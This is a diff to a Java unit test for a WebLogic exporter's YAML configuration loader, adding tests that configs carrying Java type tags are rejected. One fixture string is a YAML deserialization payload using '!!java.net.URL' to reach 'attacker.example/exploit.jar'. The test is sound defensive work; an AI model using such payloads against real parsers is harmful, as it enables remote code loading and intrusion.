@@ -3,6 +3,8 @@
 
 package com.oracle.wls.exporter.domain;
 
+import java.io.ByteArrayInputStream;
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashMap;
@@ -19,7 +21,6 @@ import org.hamcrest.TypeSafeDiagnosingMatcher;
 import org.junit.jupiter.api.AfterEach;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
-import org.yaml.snakeyaml.Yaml;
 
 import static com.oracle.wls.exporter.domain.ExporterConfig.DOMAIN_NAME_PROPERTY;
 import static com.oracle.wls.exporter.domain.ExporterConfigTest.QueryHierarchyMatcher.hasQueryFor;
@@ -220,10 +221,23 @@ class ExporterConfigTest {
     }
 
     private ExporterConfig loadFromString(String yamlString) {
-        yamlConfig = new Yaml().load(yamlString);
-
-        return ExporterConfig.loadConfig(yamlConfig);
+        return ExporterConfig.loadConfig(yamlString);
     }
+
+    @Test
+    void whenStringConfigContainsJavaTypeTag_rejectIt() {
+        assertThrows(YamlParserException.class, () -> ExporterConfig.loadConfig(CONFIG_WITH_JAVA_TYPE_TAG));
+    }
+
+    @Test
+    void whenInputStreamConfigContainsJavaTypeTag_rejectIt() {
+        assertThrows(YamlParserException.class,
+                () -> ExporterConfig.loadConfig(new ByteArrayInputStream(
+                        CONFIG_WITH_JAVA_TYPE_TAG.getBytes(StandardCharsets.UTF_8))));
+    }
+
+    private static final String CONFIG_WITH_JAVA_TYPE_TAG =
+            "queries: !!java.net.URL [\"http://attacker.example/exploit.jar\"]\n";
 
     @Test
     void afterLoad_hasExpectedQuery() {
